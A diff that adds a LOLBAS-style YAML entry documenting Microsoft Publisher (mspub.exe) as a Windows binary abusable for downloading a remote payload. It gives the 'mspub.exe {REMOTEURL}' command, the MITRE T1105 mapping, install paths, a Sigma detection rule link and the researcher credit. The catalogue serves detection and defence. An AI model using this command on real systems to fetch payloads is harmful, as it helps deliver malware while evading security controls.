@@ -1,0 +1,34 @@
+---
+Name: Mspub.exe
+Description: Microsoft Publisher
+Author: Nir Chako
+Created: 2022-08-02
+Commands:
+  - Command: mspub.exe {REMOTEURL}
+    Description: Downloads payload from remote server
+    Usecase: It will download a remote payload and place it in INetCache.
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Download: INetCache
+Full_Path:
+  - Path: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSPUB.exe
+  - Path: C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSPUB.exe
+  - Path: C:\Program Files (x86)\Microsoft Office\Office16\MSPUB.exe
+  - Path: C:\Program Files\Microsoft Office\Office16\MSPUB.exe
+  - Path: C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\MSPUB.exe
+  - Path: C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\MSPUB.exe
+  - Path: C:\Program Files (x86)\Microsoft Office\Office15\MSPUB.exe
+  - Path: C:\Program Files\Microsoft Office\Office15\MSPUB.exe
+  - Path: C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\MSPUB.exe
+  - Path: C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\MSPUB.exe
+  - Path: C:\Program Files (x86)\Microsoft Office\Office14\MSPUB.exe
+  - Path: C:\Program Files\Microsoft Office\Office14\MSPUB.exe
+Detection:
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_mspub_download.yml
+  - IOC: Suspicious Office application internet/network traffic
+Acknowledgement:
+  - Person: 'Nir Chako (Pentera)'
+    Handle: '@C_h4ck_0'
